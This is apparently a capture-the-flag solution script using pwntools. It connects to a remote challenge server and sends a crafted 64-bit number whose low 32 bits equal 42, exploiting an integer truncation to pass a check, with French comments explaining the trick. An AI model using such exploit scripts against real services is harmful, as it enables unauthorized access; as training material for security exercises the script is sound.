#!/usr/bin/env python3
from pwn import *
context.update(arch='amd64', timeout=1)

p = remote("cytech.tcdn.casa", 4203)

# quand le long (64bits) est cast en int (32bits), il perd les 4 bytes de poids fort.
# donc il nous faut un long plus grand que 1000, mais dont les 4 bytes
# LSB sont equivalents a 42.
magic_num_bytes = p32(42) + p32(1)
log.info("Hex view:")
log.hexdump(magic_num_bytes)

magic_num = signed(u64(magic_num_bytes))
log.info(f"Decimal view: {magic_num}")

p.sendline(str(magic_num).encode())
p.interactive()